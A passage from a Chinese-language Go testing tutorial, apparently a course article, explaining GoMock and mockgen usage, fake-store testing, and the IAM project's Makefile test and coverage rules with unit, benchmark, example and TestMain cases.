class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mockgen -destination spider/mock/mock_spider.go -package spider github.com/marmotedu/gopractise-demo/gomock/spider Spider<br><br></code></pre></td></tr></table></figure><p>上面的命令会在 <code>spider/mock</code> 目录下生成 <code>mock_spider.go</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ tree .<br>.<br>├── go_version.go<br>├── go_version_test.go<br>├── go_version_test_traditional_method.go~<br>└── spider<br>    ├── mock<br>    │   └── mock_spider.go<br>    └── spider.go<br><br></code></pre></td></tr></table></figure><p><code>mock_spider.go</code> 文件中，定义了一些函数&#x2F;方法，可以支持我们编写 <code>TestGetGoVersion</code> 测试函数。这时候，我们的单元测试代码如下（见 <a href="https://github.com/marmotedu/gopractise-demo/blob/master/gomock/go_version_test.go">go_version_test.go</a> 文件）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> gomock<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;testing&quot;</span><br><br><span class="hljs-string">&quot;github.com/golang/mock/gomock&quot;</span><br><br>spider <span class="hljs-string">&quot;github.com/marmotedu/gopractise-demo/gomock/spider/mock&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestGetGoVersion</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>ctrl := gomock.NewController(t)<br><span class="hljs-keyword">defer</span> ctrl.Finish()<br><br>mockSpider := spider.NewMockSpider(ctrl)<br>mockSpider.EXPECT().GetBody().Return(<span class="hljs-string">&quot;go1.8.3&quot;</span>)<br>goVer := GetGoVersion(mockSpider)<br><br><span class="hljs-keyword">if</span> goVer != <span class="hljs-string">&quot;go1.8.3&quot;</span> &#123;<br>t.Errorf(<span class="hljs-string">&quot;Get wrong version %s&quot;</span>, goVer)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这一版本的 <code>TestGetGoVersion</code> 通过GoMock， Mock了一个 <code>Spider</code> 接口，而不用去实现一个 <code>Spider</code> 接口。这就大大降低了单元测试用例编写的复杂度。通过Mock，很多不能测试的函数也变得可测试了。</p><p>通过上面的测试用例，我们可以看到，GoMock 和 <a href="https://time.geekbang.org/column/article/408529">上一讲</a> 介绍的testing单元测试框架可以紧密地结合起来工作。</p><h3 id="mockgen工具介绍"><a href="#mockgen工具介绍" class="headerlink" title="mockgen工具介绍"></a>mockgen工具介绍</h3><p>上面，我介绍了如何使用 GoMock 编写单元测试用例。其中，我们使用到了 <code>mockgen</code> 工具来生成 Mock代码， <code>mockgen</code> 工具提供了很多有用的功能，这里我来详细介绍下。</p><p><code>mockgen</code> 工具是 GoMock 提供的，用来Mock一个Go接口。它可以根据给定的接口，来自动生成Mock代码。这里，有两种模式可以生成Mock代码，分别是源码模式和反射模式。</p><ol><li>源码模式</li></ol><p>如果有接口文件，则可以通过以下命令来生成Mock代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mockgen -destination spider/mock/mock_spider.go -package spider -<span class="hljs-built_in">source</span> spider/spider.go<br><br></code></pre></td></tr></table></figure><p>上面的命令，Mock了 <code>spider/spider.go</code> 文件中定义的 <code>Spider</code> 接口，并将Mock代码保存在 <code>spider/mock/mock_spider.go</code> 文件中，文件的包名为 <code>spider</code>。</p><p>mockgen工具的参数说明见下表：</p><p><img src="https://static001.geekbang.org/resource/image/e7/9c/e72102362e2ae3225e868f125654689c.jpg?wh=1920x1210" alt="img"></p><ol><li>反射模式</li></ol><p>此外，mockgen工具还支持通过使用反射程序来生成 Mock 代码。它通过传递两个非标志参数，即导入路径和逗号分隔的接口列表来启用，其他参数和源码模式共用，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mockgen -destination spider/mock/mock_spider.go -package spider github.com/marmotedu/gopractise-demo/gomock/spider Spider<br><br></code></pre></td></tr></table></figure><h3 id="通过注释使用mockgen"><a href="#通过注释使用mockgen" class="headerlink" title="通过注释使用mockgen"></a>通过注释使用mockgen</h3><p>如果有多个文件，并且分散在不同的位置，那么我们要生成Mock文件的时候，需要对每个文件执行多次mockgen命令（这里假设包名不相同）。这种操作还是比较繁琐的，mockgen还提供了一种通过注释生成Mock文件的方式，此时需要借助 <code>go generate</code> 工具。</p><p>在接口文件的代码中，添加以下注释（具体代码见 <a href="https://github.com/marmotedu/gopractise-demo/blob/master/gomock/spider/spider.go#L3">spider.go</a> 文件）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//go:generate mockgen -destination mock_spider.go -package spider github.com/cz-it/blog/blog/Go/testing/gomock/example/spider Spider</span><br><br></code></pre></td></tr></table></figure><p>这时候，我们只需要在 <code>gomock</code> 目录下，执行以下命令，就可以自动生成Mock代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go generate ./...<br><br></code></pre></td></tr></table></figure><h3 id="使用Mock代码编写单元测试用例"><a href="#使用Mock代码编写单元测试用例" class="headerlink" title="使用Mock代码编写单元测试用例"></a>使用Mock代码编写单元测试用例</h3><p>生成了Mock代码之后，我们就可以使用它们了。这里我们结合 <code>testing</code> 来编写一个使用了Mock代码的单元测试用例。</p><p><strong>首先，</strong> 需要在单元测试代码里创建一个Mock控制器：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">ctrl := gomock.NewController(t)<br><br></code></pre></td></tr></table></figure><p>将 <code>*testing.T</code> 传递给GoMock ，生成一个 <code>Controller</code> 对象，该对象控制了整个Mock的过程。在操作完后，还需要进行回收，所以一般会在 <code>NewController</code> 后面defer一个Finish，代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">defer</span> ctrl.Finish()<br><br></code></pre></td></tr></table></figure><p><strong>然后，</strong> 就可以调用Mock的对象了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">mockSpider := spider.NewMockSpider(ctrl)<br><br></code></pre></td></tr></table></figure><p>这里的 <code>spider</code> 是mockgen命令里面传递的包名，后面是 <code>NewMockXxxx</code> 格式的对象创建函数， <code>Xxx</code> 是接口名。这里，我们需要传递控制器对象进去，返回一个Mock实例。</p><p><strong>接着，</strong> 有了Mock实例，我们就可以调用其断言方法 <code>EXPECT()</code> 了。</p><p>gomock采用了链式调用法，通过 <code>.</code> 连接函数调用，可以像链条一样连接下去。例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">mockSpider.EXPECT().GetBody().Return(<span class="hljs-string">&quot;go1.8.3&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>Mock一个接口的方法，我们需要Mock该方法的入参和返回值。我们可以通过参数匹配来Mock入参，通过Mock实例的 <code>Return</code> 方法来Mock返回值。下面，我们来分别看下如何指定入参和返回值。</p><p>先来看如何指定入参。如果函数有参数，我们可以使用参数匹配来指代函数的参数，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">mockSpider.EXPECT().GetBody(gomock.Any(), gomock.Eq(<span class="hljs-string">&quot;admin&quot;</span>)).Return(<span class="hljs-string">&quot;go1.8.3&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>gomock支持以下参数匹配：</p><ul><li>gomock.Any()，可以用来表示任意的入参。</li><li>gomock.Eq(value)，用来表示与 value 等价的值。</li><li>gomock.Not(value)，用来表示非 value 以外的值。</li><li>gomock.Nil()，用来表示 None 值。</li></ul><p>接下来，我们看如何指定返回值。</p><p><code>EXPECT()</code> 得到Mock的实例，然后调用Mock实例的方法，该方法返回第一个 <code>Call</code> 对象，然后可以对其进行条件约束，比如使用Mock实例的 <code>Return</code> 方法约束其返回值。 <code>Call</code> 对象还提供了以下方法来约束Mock实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Call)</span></span> After(preReq *Call) *Call <span class="hljs-comment">// After声明调用在preReq完成后执行</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Call)</span></span> AnyTimes() *Call <span class="hljs-comment">// 允许调用次数为 0 次或更多次</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Call)</span></span> Do(f <span class="hljs-keyword">interface</span>&#123;&#125;) *Call <span class="hljs-comment">// 声明在匹配时要运行的操作</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Call)</span></span> MaxTimes(n <span class="hljs-type">int</span>) *Call <span class="hljs-comment">// 设置最大的调用次数为 n 次</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Call)</span></span> MinTimes(n <span class="hljs-type">int</span>) *Call <span class="hljs-comment">// 设置最小的调用次数为 n 次</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Call)</span></span> Return(rets ...<span class="hljs-keyword">interface</span>&#123;&#125;) *Call <span class="hljs-comment">//  // 声明模拟函数调用返回的值</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Call)</span></span> SetArg(n <span class="hljs-type">int</span>, value <span class="hljs-keyword">interface</span>&#123;&#125;) *Call <span class="hljs-comment">// 声明使用指针设置第 n 个参数的值</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Call)</span></span> Times(n <span class="hljs-type">int</span>) *Call <span class="hljs-comment">// 设置调用次数为 n 次</span><br><br></code></pre></td></tr></table></figure><p>上面列出了多个 <code>Call</code> 对象提供的约束方法，接下来我会介绍3个常用的约束方法：指定返回值、指定执行次数和指定执行顺序。</p><ol><li>指定返回值</li></ol><p>我们可以提供调用 <code>Call</code> 的 <code>Return</code> 函数，来指定接口的返回值，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">mockSpider.EXPECT().GetBody().Return(<span class="hljs-string">&quot;go1.8.3&quot;</span>)<br><br></code></pre></td></tr></table></figure><ol><li>指定执行次数</li></ol><p>有时候，我们需要指定函数执行多少次，例如：对于接受网络请求的函数，计算其执行了多少次。我们可以通过 <code>Call</code> 的 <code>Times</code> 函数来指定执行次数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">mockSpider.EXPECT().Recv().Return(<span class="hljs-literal">nil</span>).Times(<span class="hljs-number">3</span>)<br><br></code></pre></td></tr></table></figure><p>上述代码，执行了三次Recv函数，这里gomock还支持其他的执行次数限制：</p><ul><li>AnyTimes()，表示执行0到多次。</li><li>MaxTimes(n int)，表示如果没有设置，最多执行n次。</li><li>MinTimes(n int)，表示如果没有设置，最少执行n次。</li></ul><ol><li>指定执行顺序</li></ol><p>有时候，我们还要指定执行顺序，比如要先执行 Init 操作，然后才能执行Recv操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">initCall := mockSpider.EXPECT().Init()<br>mockSpider.EXPECT().Recv().After(initCall)<br><br></code></pre></td></tr></table></figure><p>最后，我们可以使用 <code>go test</code> 来测试使用了Mock代码的单元测试代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -v<br>=== RUN   TestGetGoVersion<br>--- PASS: TestGetGoVersion (0.00s)<br>PASS<br>ok  github.com/marmotedu/gopractise-demo/gomock0.002s<br><br></code></pre></td></tr></table></figure><h2 id="Fake测试"><a href="#Fake测试" class="headerlink" title="Fake测试"></a>Fake测试</h2><p>在Go项目开发中，对于比较复杂的接口，我们还可以Fake一个接口实现，来进行测试。所谓Fake测试，其实就是针对接口实现一个假（fake）的实例。至于如何实现Fake实例，需要你根据业务自行实现。例如：IAM项目中iam-apiserver组件就实现了一个fake store，代码见 <a href="https://github.com/marmotedu/iam/tree/v1.0.8/internal/apiserver/store/fake">fake</a> 目录。接下来基于IAM项目测试实战部分介绍</p><h2 id="IAM项目测试实战"><a href="#IAM项目测试实战" class="headerlink" title="IAM项目测试实战"></a>IAM项目测试实战</h2><h3 id="IAM项目是如何运行测试用例的？"><a href="#IAM项目是如何运行测试用例的？" class="headerlink" title="IAM项目是如何运行测试用例的？"></a>IAM项目是如何运行测试用例的？</h3><p>首先，我们来看下IAM项目是如何执行测试用例的。</p><p>在IAM项目的源码根目录下，可以通过运行 <code>make test</code> 执行测试用例， <code>make test</code> 会执行 <code>iam/scripts/make-rules/golang.mk</code> 文件中的 <code>go.test</code> 伪目标，规则如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: go.test</span><br><span class="hljs-section">go.test: tools.verify.go-junit-report</span><br>  @echo <span class="hljs-string">&quot;===========&gt; Run unit test&quot;</span><br>  @set -o pipefail;<span class="hljs-variable">$(GO)</span> test -race -cover -coverprofile=<span class="hljs-variable">$(OUTPUT_DIR)</span>/coverage.out \\<br>    -timeout=10m -short -v `go list ./...|\<br>    egrep -v <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> <span class="hljs-variable">$(SPACE)</span>,&#x27;|&#x27;,$(<span class="hljs-built_in">sort</span> <span class="hljs-variable">$(EXCLUDE_TESTS)</span>)</span>)` 2&gt;&amp;1 | \\<br>    tee &gt;(go-junit-report --set-exit-code &gt;<span class="hljs-variable">$(OUTPUT_DIR)</span>/report.xml)<br>  @sed -i &#x27;/mock_.*.go/d&#x27; <span class="hljs-variable">$(OUTPUT_DIR)</span>/coverage.out <span class="hljs-comment"># remove mock_.*.go files from test coverage</span><br>  @<span class="hljs-variable">$(GO)</span> tool cover -html=<span class="hljs-variable">$(OUTPUT_DIR)</span>/coverage.out -o <span class="hljs-variable">$(OUTPUT_DIR)</span>/coverage.html<br><br></code></pre></td></tr></table></figure><p>在上述规则中，我们执行 <code>go test</code> 时设置了超时时间、竞态检查，开启了代码覆盖率检查，覆盖率测试数据保存在了 <code>coverage.out</code> 文件中。在Go项目开发中，并不是所有的包都需要单元测试，所以上面的命令还过滤掉了一些不需要测试的包，这些包配置在 <code>EXCLUDE_TESTS</code> 变量中：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">EXCLUDE_TESTS=github.com/marmotedu/iam/test github.com/marmotedu/iam/pkg/log github.com/marmotedu/iam/third_party github.com/marmotedu/iam/internal/pump/storage github.com/marmotedu/iam/internal/pump github.com/marmotedu/iam/internal/pkg/logger<br><br></code></pre></td></tr></table></figure><p>同时，也调用了 <code>go-junit-report</code> 将go test的结果转化成了xml格式的报告文件，该报告文件会被一些CI系统，例如Jenkins拿来解析并展示结果。上述代码也同时生成了coverage.html文件，该文件可以存放在制品库中，供我们后期分析查看。</p><p>这里需要注意，Mock的代码是不需要编写测试用例的，为了避免影响项目的单元测试覆盖率，需要将Mock代码的单元测试覆盖率数据从 <code>coverage.out</code> 文件中删除掉， <code>go.test</code> 规则通过以下命令删除这些无用的数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed -i <span class="hljs-string">&#x27;/mock_.*.go/d&#x27;</span> $(OUTPUT_DIR)/coverage.out <span class="hljs-comment"># remove mock_.*.go files from test coverage</span><br><br></code></pre></td></tr></table></figure><p>另外，还可以通过 <code>make cover</code> 来进行单元测试覆盖率测试， <code>make cover</code> 会执行 <code>iam/scripts/make-rules/golang.mk</code> 文件中的 <code>go.test.cover</code> 伪目标，规则如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: go.test.cover</span><br><span class="hljs-section">go.test.cover: go.test</span><br>  @<span class="hljs-variable">$(GO)</span> tool cover -func=<span class="hljs-variable">$(OUTPUT_DIR)</span>/coverage.out | \\<br>    awk -v target=<span class="hljs-variable">$(COVERAGE)</span> -f <span class="hljs-variable">$(ROOT_DIR)</span>/scripts/coverage.awk<br><br></code></pre></td></tr></table></figure><p>上述目标依赖 <code>go.test</code>，也就是说执行单元测试覆盖率目标之前，会先进行单元测试，然后使用单元测试产生的覆盖率数据 <code>coverage.out</code> 计算出总的单元测试覆盖率，这里是通过 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/scripts/coverage.awk">coverage.awk</a> 脚本来计算的。</p><p>如果单元测试覆盖率不达标，Makefile会报错并退出。可以通过Makefile的 <a href="https://github.com/marmotedu/iam/blob/master/scripts/make-rules/common.mk#L39-L41">COVERAGE</a> 变量来设置单元测试覆盖率阈值。</p><p>COVERAGE的默认值为60，我们也可以在命令行手动指定，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make cover COVERAGE=80<br><br></code></pre></td></tr></table></figure><p>为了确保项目的单元测试覆盖率达标，需要设置单元测试覆盖率质量红线。一般来说，这些红线很难靠开发者的自觉性去保障，所以好的方法是将质量红线加入到CICD流程中。</p><p>所以，在 <code>Makefile</code> 文件中，我将 <code>cover</code> 放在 <code>all</code> 目标的依赖中，并且位于build之前，也就是 <code>all: gen add-copyright format lint cover build</code>。这样每次当我们执行make时，会自动进行代码测试，并计算单元测试覆盖率，如果覆盖率不达标，则停止构建；如果达标，继续进入下一步的构建流程。</p><h3 id="IAM项目测试案例分享"><a href="#IAM项目测试案例分享" class="headerlink" title="IAM项目测试案例分享"></a>IAM项目测试案例分享</h3><ol><li>单元测试案例</li></ol><p>我们可以手动编写单元测试代码，也可以使用gotests工具生成单元测试代码。</p><p>先来看手动编写测试代码的案例。这里单元测试代码见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/pkg/log/log_test.go#L52-L62">Test_Option</a>，代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Test_Option</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    fs := pflag.NewFlagSet(<span class="hljs-string">&quot;test&quot;</span>, pflag.ExitOnError)<br>    opt := log.NewOptions()<br>    opt.AddFlags(fs)<br><br>    args := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;--log.level=debug&quot;</span>&#125;<br>    err := fs.Parse(args)<br>    assert.Nil(t, err)<br><br>    assert.Equal(t, <span class="hljs-string">&quot;debug&quot;</span>, opt.Level)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上述代码中，使用了 <code>github.com/stretchr/testify/assert</code> 包来对比结果。</p><p>再来看使用gotests工具生成单元测试代码的案例（Table-Driven 的测试模式）。出于效率上的考虑，IAM项目的单元测试用例，基本都是使用gotests工具生成测试用例模板代码，并基于这些模板代码填充测试Case的。代码见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/service_test.go">service_test.go</a> 文件。</p><ol><li>性能测试案例</li></ol><p>IAM项目的性能测试用例，见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/user_test.go#L27-L41">BenchmarkListUser</a> 测试函数。代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkListUser</span><span class="hljs-params">(b *testing.B)</span></span> &#123;<br>opts := metav1.ListOptions&#123;<br>Offset: pointer.ToInt64(<span class="hljs-number">0</span>),<br>Limit:  pointer.ToInt64(<span class="hljs-number">50</span>),<br>&#125;<br>storeIns, _ := fake.GetFakeFactoryOr()<br>u := &amp;userService&#123;<br>store: storeIns,<br>&#125;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>_, _ = u.List(context.TODO(), opts)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>示例测试案例</li></ol><p>IAM项目的示例测试用例见 <a href="https://github.com/marmotedu/errors/blob/v1.0.2/example_test.go">example_test.go</a> 文件。 <code>example_test.go</code> 中的一个示例测试代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleNew</span><span class="hljs-params">()</span></span> &#123;<br>err := New(<span class="hljs-string">&quot;whoops&quot;</span>)<br>fmt.Println(err)<br><br><span class="hljs-comment">// Output: whoops</span><br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>TestMain测试案例</li></ol><p>IAM项目的TestMain测试案例，见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/user_test.go">user_test.go</a> 文件中的 <code>TestMain</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMain</span><span class="hljs-params">(m *testing.M)</span></span> &#123;<br>    _, _ = fake.GetFakeFactoryOr()<br>    os.Exit(m.Run())<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>TestMain</code> 函数初始化了fake Factory，然后调用 <code>m.Run</code> 执行测试用例。</p><ol><li>Mock测试案例</li></ol><p>Mock代码见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/mock_service.go">internal&#x2F;apiserver&#x2F;service&#x2F;v1&#x2F;mock_service.go</a>，使用Mock的测试用例见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/controller/v1/user/create_test.go">internal&#x2F;apiserver&#x2F;controller&#x2F;v1&#x2F;user&#x2F;create_test.go</a> 文件。因为代码比较多，这里建议你打开链接，查看测试用例的具体实现。</p><p>我们可以在IAM项目的根目录下执行以下命令，来自动生成所有的Mock文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go generate ./...<br><br></code></pre></td></tr></table></figure><ol><li>Fake测试案例</li></ol><p>fake store代码实现位于 <a href="https://github.com/marmotedu/iam/tree/v1.0.8/internal/apiserver/store/fake">internal&#x2F;apiserver&#x2F;store&#x2F;fake</a> 目录下。fake store的使用方式，见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/user_test.go">user_test.go</a> 文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMain</span><span class="hljs-params">(m *testing.M)</span></span> &#123;<br>    _, _ = fake.GetFakeFactoryOr()<br>    os.Exit(m.Run())<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkListUser</span><span class="hljs-params">(b *testing.B)</span></span> &#123;<br>    opts := metav1.ListOptions&#123;<br>        Offset: pointer.ToInt64(<span class="hljs-number">0</span>),<br>        Limit:  pointer.ToInt64(<span class="hljs-number">50</span>),<br>    &#125;<br>    storeIns, _ := fake.GetFakeFactoryOr()<br>    u := &amp;userService&#123;<br>        store: storeIns,<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>        _, _ = u.List(context.TODO(), opts)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上述代码通过 <code>TestMain</code> 初始化fake实例（ <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/store/store.go#L12-L17">store.Factory</a> 接口类型）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetFakeFactoryOr</span><span class="hljs-params">()</span></span> (store.Factory, <span class="hljs-type">error</span>) &#123;<br>    once.Do(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        fakeFactory = &amp;datastore&#123;<br>            users:    FakeUsers(ResourceCount),<br>            secrets:  FakeSecrets(ResourceCount),<br>            policies: FakePolicies(ResourceCount),<br>        &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">if</span> fakeFactory == <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to get mysql store fatory, mysqlFactory: %+v&quot;</span>, fakeFactory)<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> fakeFactory, <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>GetFakeFactoryOr</code> 函数，创建了一些fake users、secrets、policies，并保存在了 <code>fakeFactory</code> 变量中，供后面的测试用例使用，例如BenchmarkListUser、Test_newUsers等。</p><h2 id="其他测试工具-x2F-包"><a href="#其他测试工具-x2F-包" class="headerlink" title="其他测试工具&#x2F;包"></a>其他测试工具&#x2F;包</h2><h3 id="测试框架"><a href="#测试框架" class="headerlink" title="测试框架"></a>测试框架</h3><ul><li><a href="https://github.com/stretchr/testify">Testify框架</a>：Testify是Go test的预判工具，它能让你的测试代码变得更优雅和高效，测试结果也变得更详细。</li><li><a href="https://github.com/smartystreets/goconvey">GoConvey框架</a>：GoConvey是一款针对Golang的测试框架，可以管理和运行测试用例，同时提供了丰富的断言函数，并支持很多 Web 界面特性。</li></ul><h3 id="Mock工具"><a href="#Mock工具" class="headerlink" 